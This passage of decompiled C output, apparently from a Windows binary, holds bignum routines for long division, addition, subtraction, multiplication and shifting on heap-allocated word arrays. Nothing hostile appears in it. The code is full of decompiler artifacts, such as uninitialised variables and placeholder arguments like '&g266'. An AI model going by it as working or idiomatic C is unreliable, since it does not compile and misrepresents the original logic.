    int32_t v21; // 0x4025a0
    int32_t v22; // 0x4025a0
    int32_t v23; // 0x4025a0
    int32_t v24; // 0x4025a0
    int32_t v25; // 0x4025a0
    int32_t v26; // 0x4025a0
    int32_t v27; // 0x4025a0
    uint32_t v28; // 0x4025a0
    int32_t v29; // 0x4025a0
    uint32_t v30; // 0x4025a0
    uint32_t v31; // 0x4025a0
    uint32_t v32; // 0x4025a0
    int32_t v33; // 0x4025a0
    int32_t v34; // 0x4025a0
    int32_t v35; // 0x4025a0
    int32_t v36; // 0x4025a0
    uint32_t v37; // 0x40263b
    int32_t v38; // 0x40263e
    uint32_t v39; // 0x40265e
    uint32_t v40; // 0x402676
    uint32_t v41; // 0x40267e
    int32_t * v42; // 0x402680
    uint32_t v43; // 0x402680
    int32_t v44; // 0x4025a0
    uint32_t v45; // 0x40268f
    int32_t v46; // 0x4026a6
    uint32_t v47; // 0x4026b5
    int32_t v48; // 0x4026bc
    uint32_t v49; // 0x4026c1
    uint32_t v50; // 0x4026ec
    uint32_t v51; // 0x4026f6
    int32_t v52; // 0x402700
    uint32_t v53; // 0x402712
    uint32_t v54; // 0x40271b
    int32_t v55; // 0x402724
    int32_t v56; // 0x402727
    uint32_t v57; // 0x40272c
    int32_t v58; // 0x40273e
    uint32_t v59; // 0x40276b
    uint32_t v60; // 0x40277c
    int32_t v61; // 0x40277e
    int32_t * v62; // 0x4027a0
    uint32_t v63; // 0x4027a5
    uint32_t v64; // 0x4027ab
    uint32_t v65; // 0x4027ab
    int32_t v66; // 0x4027b8
    int32_t v67; // 0x4027bb
    if (a2 == v2 == v20 == v3) {
        // 0x402613
        *v13 = -1;
        *v14 = a4;
        function_401b30(v6, v17, v16, v3);
        v34 = *v19;
        v27 = -1;
    } else {
        // 0x402634
        v37 = a2 / 0x10000;
        v38 = a2 & 0xffff;
        v28 = v38 * v9;
        v29 = v37 * v10;
        v30 = v37 * v9;
        v39 = v38 * v10 + v30 + v28 / 0x10000;
        v40 = 0x10000 * v39 | v28 & 0xffff;
        v41 = v40 + v20;
        v42 = (int32_t *)v17;
        v43 = *v42;
        v44 = v39 / 0x10000 + a2 + (v39 >= v30 ? v29 : v29 + 0x10000);
        v45 = v44 + (int32_t)(v41 < v40);
        v46 = (v41 < v40 ? 2 : 1) + v44;
        v47 = v43 - v3;
        v48 = v45 & 0xffff;
        v49 = v45 / 0x10000;
        v31 = v48 * v12;
        v32 = v48 * v11;
        v33 = v49 * v11;
        v50 = v49 * v12 + v32 + v31 / 0x10000;
        v51 = 0x10000 * v50 | v31 & 0xffff;
        v52 = v50 >= v32 ? v33 : v33 + 0x10000;
        v53 = v47 - v51;
        v54 = -1 * v46 * v2 + v20 - v50 / 0x10000 - v52 + (int32_t)(v43 < v3) + (int32_t)(v47 < v51);
        v55 = v54 >= v41;
        v56 = v46 + v55;
        v57 = (v3 & v55) + v53;
        v58 = (v2 & v55) + v54 + (int32_t)(v57 < v53);
        v35 = v56;
        v23 = v58;
        v24 = v57;
        if (v58 >= v2) {
            // 0x402744
            v35 = v56;
            v23 = v58;
            v24 = v57;
            if (v57 < v3 != v58 <= v2) {
                // 0x40274d
                v35 = v56 + 1;
                v23 = (int32_t)(v57 < v3) - v2 + v58;
                v24 = v57 - v3;
            }
        }
        // 0x40275d
        v36 = v35;
        *v13 = v36;
        *v14 = a4 - 2;
        v59 = function_401b30(v41, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        v60 = (int32_t)(v24 < v59);
        v61 = v23 - v60;
        *v42 = v24 - v59;
        v34 = v61;
        v27 = v36;
        if (v23 < v60) {
            // 0x402789
            v21 = 0;
            v26 = v18;
            v25 = 0;
            v22 = 0;
            if (v15 >= 1) {
                v62 = (int32_t *)v26;
                v63 = *v62 + v21;
                v64 = *(int32_t *)(4 * v25 + a3);
                v65 = v63 + v64;
                *v62 = v65;
                v66 = v25 + 1;
                v67 = (int32_t)(v65 < v64) + (int32_t)(v63 < v21);
                v21 = v67;
                v26 += 4;
                v25 = v66;
                v22 = v67;
                while (v66 != v15) {
                    // 0x4027a0
                    v62 = (int32_t *)v26;
                    v63 = *v62 + v21;
                    v64 = *(int32_t *)(4 * v25 + a3);
                    v65 = v63 + v64;
                    *v62 = v65;
                    v66 = v25 + 1;
                    v67 = (int32_t)(v65 < v64) + (int32_t)(v63 < v21);
                    v21 = v67;
                    v26 += 4;
                    v25 = v66;
                    v22 = v67;
                }
            }
            // 0x4027c8
            v34 = v61 + v2 + v22;
            v27 = v36 - 1;
        }
    }
    int32_t v68 = v34;
    int32_t v69; // 0x4025a0
    if (v69 != 0) {
        // 0x4027e5
        *(int32_t *)(v69 - v7 + v18) = v27;
    }
    int32_t v70 = v6 - 1; // 0x4027f5
    int32_t v71 = v18 - 4; // 0x40280a
    int32_t v72 = v17 - 4; // 0x40280a
    while (v70 >= 0) {
        uint32_t v73 = v68;
        v17 = v72;
        int32_t v74 = v70;
        v18 = v71;
        v16 -= 4;
        v19 = (int32_t *)v16;
        v20 = *v19;
        if (v73 == v2 == v20 == v3) {
            // 0x402613
            *v13 = -1;
            *v14 = a4;
            function_401b30(v74, v17, v16, v3);
            v34 = *v19;
            v27 = -1;
        } else {
            // 0x402634
            v37 = v73 / 0x10000;
            v38 = v73 & 0xffff;
            v28 = v38 * v9;
            v29 = v37 * v10;
            v30 = v37 * v9;
            v39 = v38 * v10 + v30 + v28 / 0x10000;
            v40 = 0x10000 * v39 | v28 & 0xffff;
            v41 = v40 + v20;
            v42 = (int32_t *)v17;
            v43 = *v42;
            v44 = v39 / 0x10000 + v73 + (v39 >= v30 ? v29 : v29 + 0x10000);
            v45 = v44 + (int32_t)(v41 < v40);
            v46 = (v41 < v40 ? 2 : 1) + v44;
            v47 = v43 - v3;
            v48 = v45 & 0xffff;
            v49 = v45 / 0x10000;
            v31 = v48 * v12;
            v32 = v48 * v11;
            v33 = v49 * v11;
            v50 = v49 * v12 + v32 + v31 / 0x10000;
            v51 = 0x10000 * v50 | v31 & 0xffff;
            v52 = v50 >= v32 ? v33 : v33 + 0x10000;
            v53 = v47 - v51;
            v54 = -1 * v46 * v2 + v20 - v50 / 0x10000 - v52 + (int32_t)(v43 < v3) + (int32_t)(v47 < v51);
            v55 = v54 >= v41;
            v56 = v46 + v55;
            v57 = (v3 & v55) + v53;
            v58 = (v2 & v55) + v54 + (int32_t)(v57 < v53);
            v35 = v56;
            v23 = v58;
            v24 = v57;
            if (v58 >= v2) {
                // 0x402744
                v35 = v56;
                v23 = v58;
                v24 = v57;
                if (v57 < v3 != v58 <= v2) {
                    // 0x40274d
                    v35 = v56 + 1;
                    v23 = (int32_t)(v57 < v3) - v2 + v58;
                    v24 = v57 - v3;
                }
            }
            // 0x40275d
            v36 = v35;
            *v13 = v36;
            *v14 = a4 - 2;
            v59 = function_401b30(v41, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
            v60 = (int32_t)(v24 < v59);
            v61 = v23 - v60;
            *v42 = v24 - v59;
            v34 = v61;
            v27 = v36;
            if (v23 < v60) {
                // 0x402789
                v21 = 0;
                v26 = v18;
                v25 = 0;
                v22 = 0;
                if (v15 >= 1) {
                    v62 = (int32_t *)v26;
                    v63 = *v62 + v21;
                    v64 = *(int32_t *)(4 * v25 + a3);
                    v65 = v63 + v64;
                    *v62 = v65;
                    v66 = v25 + 1;
                    v67 = (int32_t)(v65 < v64) + (int32_t)(v63 < v21);
                    v21 = v67;
                    v26 += 4;
                    v25 = v66;
                    v22 = v67;
                    while (v66 != v15) {
                        // 0x4027a0
                        v62 = (int32_t *)v26;
                        v63 = *v62 + v21;
                        v64 = *(int32_t *)(4 * v25 + a3);
                        v65 = v63 + v64;
                        *v62 = v65;
                        v66 = v25 + 1;
                        v67 = (int32_t)(v65 < v64) + (int32_t)(v63 < v21);
                        v21 = v67;
                        v26 += 4;
                        v25 = v66;
                        v22 = v67;
                    }
                }
                // 0x4027c8
                v34 = v61 + v2 + v22;
                v27 = v36 - 1;
            }
        }
        // 0x4027df
        v68 = v34;
        if (v69 != 0) {
            // 0x4027e5
            *(int32_t *)(v69 - v7 + v18) = v27;
        }
        // 0x4027eb
        v70 = v74 - 1;
        v71 = v18 - 4;
        v72 = v17 - 4;
    }
    // 0x402810
    *(int32_t *)(v7 + v1) = v68;
    return result;
}

// Address range: 0x402830 - 0x4028d5
int32_t function_402830(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x402830
    int32_t v1; // 0x402830
    if (a3 == 1) {
        int32_t result = function_402150(a1, a4); // 0x40284b
        *(int32_t *)v1 = result;
        return result;
    }
    if (a3 == 2) {
        // 0x402860
        return function_402350(v1, a1, a4);
    }
    int32_t v2 = *(int32_t *)a4; // 0x40287c
    int32_t v3 = 0; // 0x402880
    if (v2 != 0) {
        // 0x402882
        v3 = function_401d10(a1, v2);
    }
    int32_t result2 = function_4025a0(a1, v3, a2, a3, *(int32_t *)(a4 + 12)); // 0x4028be
    if (v2 != 0) {
        // 0x4028c0
        result2 = function_401d90(a3, v2);
    }
    // 0x4028ce
    return result2;
}

// Address range: 0x4028e0 - 0x402927
int32_t function_4028e0(void) {
    // 0x4028e0
    int32_t v1; // 0x4028e0
    int32_t v2 = v1 - 1; // 0x4028e6
    int32_t v3 = v2 < 0 == (v1 & -v1) < 0 == (v2 != 0) ? v1 : 1; // 0x4028e9
    int32_t * v4 = HeapReAlloc(GetProcessHeap(), (int32_t)&g266, &g266, (int32_t)&g266); // 0x402902
    int32_t result = (int32_t)v4; // 0x402902
    int32_t v5; // 0x4028e0
    *(int32_t *)v5 = v3;
    int32_t * v6 = (int32_t *)(v5 + 4); // 0x40290c
    int32_t v7 = *v6; // 0x40290c
    *(int32_t *)(v5 + 8) = result;
    if ((v7 < 0 ? -v7 : v7) > v3) {
        // 0x40291d
        *v6 = 0;
    }
    // 0x402924
    return result;
}

// Address range: 0x402930 - 0x4029be
int32_t function_402930(void) {
    // 0x402930
    int32_t v1; // 0x402930
    int32_t v2; // 0x402930
    if (v2 == v1) {
        // 0x4029b9
        int32_t result; // 0x402930
        return result;
    }
    int32_t * v3 = (int32_t *)(v1 + 4); // 0x402940
    int32_t v4 = *v3; // 0x402940
    int32_t * v5 = (int32_t *)(v2 + 8); // 0x402943
    int32_t v6 = *v5; // 0x402943
    int32_t v7 = v4 < 0 ? -v4 : v4; // 0x40294d
    int32_t v8 = v6; // 0x402951
    if (v7 > v6) {
        int32_t v9 = v7 - 1; // 0x402958
        int32_t v10 = v9 < 0 == (v7 & -v7) < 0 == (v9 != 0) ? v7 : 1; // 0x40295a
        int32_t * v11 = HeapReAlloc(GetProcessHeap(), (int32_t)&g266, &g266, (int32_t)&g266); // 0x40296f
        int32_t v12 = (int32_t)v11; // 0x40296f
        *(int32_t *)v2 = v10;
        int32_t * v13 = (int32_t *)(v2 + 4); // 0x402979
        int32_t v14 = *v13; // 0x402979
        *v5 = v12;
        v8 = v12;
        if ((v14 < 0 ? -v14 : v14) > v10) {
            // 0x402988
            *v13 = 0;
            v8 = v12;
        }
    }
    int32_t result2; // 0x4029b1
    if (v7 < 1) {
        // 0x4029b1
        result2 = *v3;
        *(int32_t *)(v2 + 4) = result2;
        // 0x4029b9
        return result2;
    }
    int32_t v15 = *(int32_t *)(v1 + 8) - v8; // 0x40299b
    int32_t v16 = 0; // 0x40299d
    int32_t v17 = v8;
    v16++;
    *(int32_t *)v17 = *(int32_t *)(v15 + v17);
    int32_t v18 = v17 + 4; // 0x4029ac
    while (v16 != v7) {
        // 0x4029a0
        v17 = v18;
        v16++;
        *(int32_t *)v17 = *(int32_t *)(v15 + v17);
        v18 = v17 + 4;
    }
    // 0x4029b1
    result2 = *v3;
    *(int32_t *)(v2 + 4) = result2;
    // 0x4029b9
    return result2;
}

// Address range: 0x4029c0 - 0x402ae8
int32_t function_4029c0(int32_t a1) {
    // 0x4029c0
    int32_t v1; // 0x4029c0
    int32_t v2 = *(int32_t *)(v1 + 4); // 0x4029d3
    int32_t v3 = *(int32_t *)(a1 + 4); // 0x4029d9
    int32_t v4 = v2 < 0 ? -v2 : v2; // 0x4029de
    int32_t v5 = v3 < 0 ? -v3 : v3; // 0x4029e3
    int32_t v6 = v4 - v5; // 0x4029e5
    uint32_t v7 = v6 < 0 == ((v6 ^ v4) & (v5 ^ v4)) < 0 ? v5 : v4; // 0x4029ec
    int32_t v8; // 0x4029c0
    int32_t v9 = *(int32_t *)(v8 + 8); // 0x402a0c
    int32_t v10 = *(int32_t *)((v6 < 0 == ((v6 ^ v4) & (v5 ^ v4)) < 0 ? v1 : a1) + 8); // 0x402a69
    int32_t v11 = 0; // 0x402a71
    if (v7 >= 1) {
        int32_t v12 = *(int32_t *)((v6 < 0 == ((v6 ^ v4) & (v5 ^ v4)) < 0 ? a1 : v1) + 8); // 0x402a64
        int32_t v13 = 0; // 0x402a7e
        int32_t v14 = v7; // 0x402a7e
        int32_t v15 = v10; // 0x402a7e
        uint32_t v16 = *(int32_t *)v15 + v13; // 0x402a85
        uint32_t v17 = *(int32_t *)(v12 - v10 + v15); // 0x402a8b
        uint32_t v18 = v16 + v17; // 0x402a8b
        v13 = (int32_t)(v18 < v17) + (int32_t)(v16 < v13);
        *(int32_t *)(v9 - v10 + v15) = v18;
        v14--;
        v15 += 4;
        v11 = v13;
        while (v14 != 0) {
            // 0x402a80
            v16 = *(int32_t *)v15 + v13;
            v17 = *(int32_t *)(v12 - v10 + v15);
            v18 = v16 + v17;
            v13 = (int32_t)(v18 < v17) + (int32_t)(v16 < v13);
            *(int32_t *)(v9 - v10 + v15) = v18;
            v14--;
            v15 += 4;
            v11 = v13;
        }
    }
    uint32_t v19 = v6 < 0 == ((v6 ^ v4) & (v5 ^ v4)) < 0 ? v4 : v5; // 0x4029f7
    if (v19 <= v7) {
        // 0x402ad9
        *(int32_t *)(4 * v19 + v9) = v11;
        return v11 + v19;
    }
    int32_t v20 = v11; // 0x402abd
    int32_t v21 = 4 * v7 + v9; // 0x402abd
    int32_t v22 = 0; // 0x402abd
    uint32_t v23 = *(int32_t *)(v10 - v9 + v21) + v20; // 0x402ac6
    *(int32_t *)v21 = v23;
    v22++;
    v20 = v23 < v20;
    v21 += 4;
    int32_t v24 = v20; // 0x402ad4
    while (v22 < v19 - v7) {
        // 0x402ac0
        v23 = *(int32_t *)(v10 - v9 + v21) + v20;
        *(int32_t *)v21 = v23;
        v22++;
        v20 = v23 < v20;
        v21 += 4;
        v24 = v20;
    }
    // 0x402ad9
    *(int32_t *)(4 * v19 + v9) = v24;
    return v24 + v19;
}

// Address range: 0x402af0 - 0x402c51
int32_t function_402af0(int32_t a1) {
    // 0x402af0
    int32_t v1; // 0x402af0
    int32_t v2 = *(int32_t *)(v1 + 4); // 0x402b00
    int32_t result = v2 < 0 ? -v2 : v2; // 0x402b0c
    int32_t v3 = *(int32_t *)(a1 + 4); // 0x402b0e
    int32_t * v4 = (int32_t *)(a1 + 8); // 0x402b11
    int32_t v5 = v3 < 0 ? -v3 : v3; // 0x402b19
    int32_t * v6 = (int32_t *)(v1 + 8); // 0x402b1e
    int32_t v7 = *v6; // 0x402b1e
    if (result == v5) {
        int32_t v8 = *v4; // 0x402b11
        int32_t v9 = result - 1; // 0x402b35
        if (v9 < 0) {
            // 0x402be5
            return 0;
        }
        int32_t v10 = 4 * v9 + v8; // 0x402b41
        int32_t v11 = v9; // 0x402b41
        uint32_t v12 = *(int32_t *)(v7 - v8 + v10); // 0x402b44
        uint32_t v13 = *(int32_t *)v10; // 0x402b47
        while (v13 == v12) {
            // 0x402b51
            v11--;
            v10 -= 4;
            if (v11 < 0) {
                // 0x402be5
                return 0;
            }
            v12 = *(int32_t *)(v7 - v8 + v10);
            v13 = *(int32_t *)v10;
        }
        if (v13 < v12) {
            goto lab_0x402b69;
        } else {
            goto lab_0x402bfb;
        }
    } else {
        int32_t v14 = result - v5; // 0x402b27
        if (v14 < 0 == ((v14 ^ result) & (v5 ^ result)) < 0) {
            goto lab_0x402b69;
        } else {
            goto lab_0x402bfb;
        }
    }
  lab_0x402b69:;
    // 0x402b69
    int32_t v15; // 0x402af0
    int32_t * v16 = (int32_t *)(v15 + 8); // 0x402b69
    int32_t v17 = *v16; // 0x402b71
    int32_t v18; // bp-28, 0x402af0
    int32_t v19 = &v18; // 0x402b71
    if (result > v15) {
        int32_t v20 = result - 1; // 0x402b78
        int32_t v21 = v20 < 0 == (result & -result) < 0 == (v20 != 0) ? result : 1; // 0x402b7a
        int32_t * hHeap = GetProcessHeap(); // 0x402b88
        int32_t v22 = (int32_t)hHeap; // bp-44, 0x402b8e
        int32_t v23 = &v22; // 0x402b8e
        int32_t * v24 = HeapReAlloc(hHeap, (int32_t)&g266, &g266, (int32_t)&g266); // 0x402b8f
        int32_t v25 = (int32_t)v24; // 0x402b8f
        *v16 = v25;
        int32_t * v26 = (int32_t *)(v15 + 4); // 0x402b9e
        int32_t v27 = *v26; // 0x402b9e
        *(int32_t *)v15 = v21;
        v17 = v25;
        v19 = v23;
        if ((v27 < 0 ? -v27 : v27) > v21) {
            // 0x402bac
            *v26 = 0;
            v17 = v25;
            v19 = v23;
        }
    }
    // 0x402bb3
    *(int32_t *)(v19 - 4) = v5;
    *(int32_t *)(v19 - 8) = *v4;
    *(int32_t *)(v19 - 12) = result;
    function_4019f0(v17, (int32_t)&g266, (int32_t)&g266);
    if (result < 1) {
        // 0x402be5
        return result;
    }
    int32_t v28 = 4 * result - 4 + v17; // 0x402bd5
    int32_t v29 = result; // 0x402bd5
    int32_t result2 = v29; // 0x402bdb
    while (*(int32_t *)v28 == 0) {
        int32_t v30 = v29 - 1; // 0x402bdd
        v28 -= 4;
        v29 = v30;
        result2 = v30;
        if (v30 >= 0 != v30 != 0) {
            // break -> 0x402be5
            break;
        }
        result2 = v29;
    }
    // 0x402be5
    return result2;
  lab_0x402bfb:;
    int32_t v31; // 0x402af0
    int32_t v32; // 0x402af0
    if (v5 > v15) {
        int32_t v33 = function_4028e0(); // 0x402c01
        v31 = *v6;
        v32 = v33;
    } else {
        // 0x402c0a
        v31 = v7;
        v32 = *(int32_t *)(v15 + 8);
    }
    // 0x402c0d
    function_4019f0(v5, v31, result);
    if (v5 < 1) {
        // 0x402c3d
        return -v5;
    }
    int32_t v34 = 4 * v5 - 4 + v32; // 0x402c2f
    int32_t v35 = v5; // 0x402c2f
    int32_t v36 = v35; // 0x402c33
    while (*(int32_t *)v34 == 0) {
        int32_t v37 = v35 - 1; // 0x402c35
        v34 -= 4;
        v35 = v37;
        v36 = v37;
        if (v37 >= 0 != v37 != 0) {
            // break -> 0x402c3d
            break;
        }
        v36 = v35;
    }
    // 0x402c3d
    return -v36;
}

// Address range: 0x402c60 - 0x402c98
int32_t function_402c60(int32_t a1) {
    // 0x402c60
    int32_t v1; // 0x402c60
    int32_t * v2 = (int32_t *)(v1 + 4); // 0x402c72
    int32_t v3; // 0x402c60
    if ((*v2 ^ *(int32_t *)(a1 + 4)) < 0) {
        // 0x402c7e
        v3 = function_402af0(a1);
    } else {
        // 0x402c77
        v3 = function_4029c0(a1);
    }
    int32_t result = -v3; // 0x402c88
    int32_t v4; // 0x402c60
    *(int32_t *)(v4 + 4) = *v2 < 0 ? result : v3;
    return result;
}

// Address range: 0x402ca0 - 0x402cd8
int32_t function_402ca0(int32_t a1) {
    // 0x402ca0
    int32_t v1; // 0x402ca0
    int32_t * v2 = (int32_t *)(v1 + 4); // 0x402cb2
    int32_t v3; // 0x402ca0
    if ((*v2 ^ *(int32_t *)(a1 + 4)) < 0) {
        // 0x402cbe
        v3 = function_4029c0(a1);
    } else {
        // 0x402cb7
        v3 = function_402af0(a1);
    }
    int32_t result = -v3; // 0x402cc8
    int32_t v4; // 0x402ca0
    *(int32_t *)(v4 + 4) = *v2 < 0 ? result : v3;
    return result;
}

// Address range: 0x402ce0 - 0x402dc5
int32_t function_402ce0(int32_t a1) {
    // 0x402ce0
    int32_t v1; // 0x402ce0
    int32_t v2 = *(int32_t *)(v1 + 4); // 0x402ced
    int32_t v3; // 0x402ce0
    if (v2 == 0) {
        // 0x402db7
        *(int32_t *)(v3 + 4) = 0;
        int32_t result; // 0x402ce0
        return result;
    }
    int32_t v4 = *(int32_t *)(a1 + 4); // 0x402cfb
    if (v4 == 0) {
        // 0x402db7
        *(int32_t *)(v3 + 4) = 0;
        return 0;
    }
    int32_t v5 = v2 < 0 ? -v2 : v2; // 0x402d15
    int32_t v6 = v4 < 0 ? -v4 : v4; // 0x402d1d
    int32_t v7 = v6 + v5; // 0x402d22
    int32_t v8 = 32 * v7; // 0x402d29
    int32_t * hHeap = GetProcessHeap(); // 0x402d40
    int32_t v9 = (int32_t)HeapAlloc(hHeap, (int32_t)&g266, (int32_t)&g266); // 0x402d47
    int32_t v10 = *(int32_t *)((v5 < v6 ? v1 : a1) + 8);
    function_401bf0(v5 < v6 ? v6 : v5, v10, v5 < v6 ? v5 : v6);
    int32_t v11 = *(int32_t *)(4 * v7 - 4 + v9) == 0; // 0x402d84
    *(int32_t *)v3 = (v8 - (int32_t)(v8 != 0)) / 32 + 1;
    *(int32_t *)(v3 + 4) = (v4 ^ v2) >= 0 ? v7 - v11 : v11 - v7;
    *(int32_t *)(v3 + 8) = v9;
    return HeapFree(GetProcessHeap(), (int32_t)&g266, &g266);
}

// Address range: 0x402dd0 - 0x402ee7
int32_t function_402dd0(uint32_t a1) {
    // 0x402dd0
    int32_t v1; // 0x402dd0
    int32_t * v2 = (int32_t *)(v1 + 4); // 0x402ddf
    int32_t result = *v2; // 0x402ddf
    int32_t v3 = result < 0 ? -result : result; // 0x402de7
    int32_t v4; // 0x402dd0
    if (v3 == 0) {
        // 0x402deb
        *(int32_t *)(v4 + 4) = v3;
        return result;
    }
    int32_t v5 = a1 & 31; // 0x402dfb
    int32_t v6 = a1 / 32; // 0x402dfe
    int32_t * v7 = (int32_t *)(v4 + 8); // 0x402e04
    int32_t v8 = v3 + v6;
    int32_t v9 = v8 + (int32_t)(v5 != 0); // 0x402e13
    int32_t v10; // bp-32, 0x402dd0
    int32_t * v11 = &v10; // 0x402e1a
    int32_t v12 = *v7; // 0x402e1a
    if (v9 > v4) {
        int32_t v13 = v9 - 1; // 0x402e21
        int32_t v14 = v13 < 0 == (v9 & -v9) < 0 == (v13 != 0) ? v9 : 1; // 0x402e23
        int32_t * hHeap = GetProcessHeap(); // 0x402e34
        int32_t v15 = (int32_t)hHeap; // bp-48, 0x402e3a
        int32_t * v16 = HeapReAlloc(hHeap, (int32_t)&g266, &g266, (int32_t)&g266); // 0x402e3b
        int32_t v17 = (int32_t)v16; // 0x402e3b
        *v7 = v17;
        int32_t * v18 = (int32_t *)(v4 + 4); // 0x402e4a
        int32_t v19 = *v18; // 0x402e4a
        *(int32_t *)v4 = v14;
        v11 = &v15;
        v12 = v17;
        if ((v19 < 0 ? -v19 : v19) > v14) {
            // 0x402e58
            *v18 = 0;
            v11 = &v15;
            v12 = v17;
        }
    }
    int32_t v20 = *(int32_t *)(v1 + 8); // 0x402e6b
    int32_t v21; // 0x402dd0
    if (v5 == 0) {
        // 0x402e96
        v21 = v9;
        if (v3 >= 1) {
            int32_t v22 = v12 + 4 * v8; // 0x402ea0
            v22 -= 4;
            int32_t v23 = v3 - 1; // 0x402eaa
            *(int32_t *)v22 = *(int32_t *)(v20 - 4 + 4 * v3);
            v21 = v9;
            while (v23 >= 0 == (v23 != 0)) {
                int32_t v24 = v23;
                v22 -= 4;
                v23 = v24 - 1;
                *(int32_t *)v22 = *(int32_t *)(v20 - 4 + 4 * v24);
                v21 = v9;
            }
        }
    } else {
        int32_t v25 = (int32_t)v11;
        *(int32_t *)(v25 - 4) = v5;
        *(int32_t *)(v25 - 8) = v3;
        int32_t v26 = function_401d10(v20, (int32_t)&g266); // 0x402e7c
        *(int32_t *)(4 * v9 - 4 + v12) = v26;
        v21 = v9 - (int32_t)(v26 == 0);
    }
    int32_t v27 = v21;
    int32_t v28 = v6; // 0x402eb6
    int32_t result2; // 0x402edc
    if (a1 < 32) {
        // 0x402ecc
        result2 = *v2 >= 0 ? v27 : -v27;
        *(int32_t *)(v4 + 4) = result2;
        return result2;
    }
    v28--;
    *(int32_t *)(4 * v28 + v12) = 0;
    while (v28 >= 0 == (v28 != 0)) {
        // 0x402ec0
        v28--;
        *(int32_t *)(4 * v28 + v12) = 0;
    }
    // 0x402ecc
    result2 = *v2 >= 0 ? v27 : -v27;
    *(int32_t *)(v4 + 4) = result2;
    return result2;
}

// Address range: 0x402ef0 - 0x403145
int32_t function_402ef0(int32_t * a1, int32_t * a2) {
    int32_t v1 = *(int32_t *)((int32_t)a1 + 4); // 0x402f09
    int32_t v2; // 0x402ef0
    int32_t v3; // 0x402ef0
    if (v1 == 0) {
        if (v3 != 0) {
            // 0x402f17
            *(int32_t *)(v3 + 4) = v1;
        }
        // 0x402f1a
        if (v2 != 0) {
            // 0x402f1e
            *(int32_t *)(v2 + 4) = 0;
        }
        // 0x402f25
        return 0;
    }
    int32_t v4 = (int32_t)a2;
    int32_t v5 = *(int32_t *)(v4 + 4); // 0x402f00
    int32_t v6 = v1 < 0 ? -v1 : v1; // 0x402f33
    int32_t v7 = v5 < 0 ? -v5 : v5; // 0x402f45
    if (v6 < v7) {
        if (v2 != 0) {
            // 0x402f50
            function_402930();
        }
        // 0x402f59
        if (v3 != 0) {
            // 0x402f5d
            *(int32_t *)(v3 + 4) = 0;
        }
        // 0x402f25
        return 1;
    }
    int32_t * hHeap = GetProcessHeap(); // 0x402f82
    int32_t v8 = (int32_t)hHeap; // bp-100, 0x402f88
    int32_t v9 = (int32_t)HeapAlloc(hHeap, (int32_t)&g266, (int32_t)&g266); // 0x402f89
    function_402930();
    int32_t v10 = v6 - v7; // 0x402fa0
    int32_t v11 = 1; // 0x402fad
    int32_t v12 = 0; // 0x402fad
    int32_t * v13 = &v8; // 0x402fad
    if (v3 != 0) {
        int32_t v14 = 32 * v10 + 32; // 0x402fb4
        int32_t * hHeap2 = GetProcessHeap(); // 0x402fd4
        int32_t v15 = (int32_t)hHeap2; // bp-112, 0x402fda
        v12 = (int32_t)HeapAlloc(hHeap2, (int32_t)&g266, (int32_t)&g266);
        v11 = (v14 - (int32_t)(v14 != 0)) / 32 + 1;
        v13 = &v15;
    }
    int32_t v16 = (int32_t)v13;
    int32_t * v17 = (int32_t *)(v16 - 4);
    *v17 = v7;
    function_402050(v12);
    int32_t * v18 = v17; // 0x403021
    int32_t v19 = *(int32_t *)(v4 + 8); // 0x403021
    int32_t v20 = v16; // 0x403021
    int32_t v21; // bp-72, 0x402ef0
    if (v7 >= 3 && v21 != 0) {
        // 0x403029
        *v17 = 4 * v7;
        *(int32_t *)(v16 - 8) = 8;
        int32_t * v22 = GetProcessHeap(); // 0x403033
        v20 = v16 - 12;
        *(int32_t *)v20 = (int32_t)v22;
        v19 = (int32_t)HeapAlloc(&g266, (int32_t)&g266, (int32_t)&g266);
        v18 = (int32_t *)(v16 - 16);
        *v18 = v21;
        *(int32_t *)(v16 - 20) = v7;
        function_401d10(v19, (int32_t)&g266);
    }
    // 0x40305c
    *v18 = (int32_t)&v21;
    int32_t * v23 = (int32_t *)(v20 - 8); // 0x403063
    *v23 = v7;
    int32_t * v24 = (int32_t *)(v20 - 12); // 0x403064
    *v24 = v19;
    *(int32_t *)(v20 - 16) = v6;
    function_402830((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
    if (v19 != 0) {
        // 0x40307a
        *v18 = v19;
        *v23 = 0;
        *v24 = (int32_t)GetProcessHeap();
        HeapFree(&g266, (int32_t)&g266, &g266);
    }
    int32_t v25 = 0; // 0x40308f
    if (v12 != 0) {
        int32_t v26 = v10 + (int32_t)(*(int32_t *)(v12 + 4 * v10) != 0); // 0x40309d
        v25 = (v1 ^ v5) >= 0 ? v26 : -v26;
    }
    int32_t v27 = v7; // 0x4030af
    if (v7 >= 1) {
        int32_t v28 = 4 * v7 + v9; // 0x4030ba
        int32_t v29 = v7; // 0x4030ba
        v28 -= 4;
        v27 = v29;
        while (*(int32_t *)v28 == 0) {
            // 0x4030c5
            v29--;
            v27 = v29;
            if (v29 >= 0 != v29 != 0) {
                // break -> 0x4030cd
                break;
            }
            v28 -= 4;
            v27 = v29;
        }
    }
    int32_t v30 = v27;
    int32_t v31 = v20; // 0x4030e1
    if (v3 != 0) {
        // 0x4030e3
        *(int32_t *)v3 = v11;
        int32_t * v32 = (int32_t *)(v3 + 8); // 0x4030e8
        *(int32_t *)(v3 + 4) = v25;
        *(int32_t *)(v20 - 4) = *v32;
        *v32 = v12;
        *(int32_t *)(v20 - 8) = 0;
        int32_t * v33 = GetProcessHeap(); // 0x4030fd
        v31 = v20 - 12;
        *(int32_t *)v31 = (int32_t)v33;
        HeapFree(&g266, (int32_t)&g266, &g266);
    }
    int32_t v34 = v9; // 0x403110
    if (v2 != 0) {
        int32_t * v35 = (int32_t *)(v2 + 8); // 0x403115
        v34 = *v35;
        *(int32_t *)(v2 + 4) = v1 >= 0 ? v30 : -v30;
        *(int32_t *)v2 = 1;
        *v35 = v9;
    }
    // 0x40312b
    *(int32_t *)(v31 - 4) = v34;
    *(int32_t *)(v31 - 8) = 0;
    *(int32_t *)(v31 - 12) = (int32_t)GetProcessHeap();
    HeapFree(&g266, (int32_t)&g266, &g266);
    return v30 != 0;
}

// Address range: 0x403150 - 0x403203
int32_t function_403150(uint32_t a1) {
    // 0x403150
    int32_t v1; // 0x403150
    uint32_t result = *(int32_t *)(v1 + 4); // 0x40315e
    int32_t v2; // 0x403150
    if (result == 0) {
        // 0x403168
        *(int32_t *)(v2 + 4) = result;
        return result;
    }
    uint32_t v3 = a1 / 32; // 0x40317a
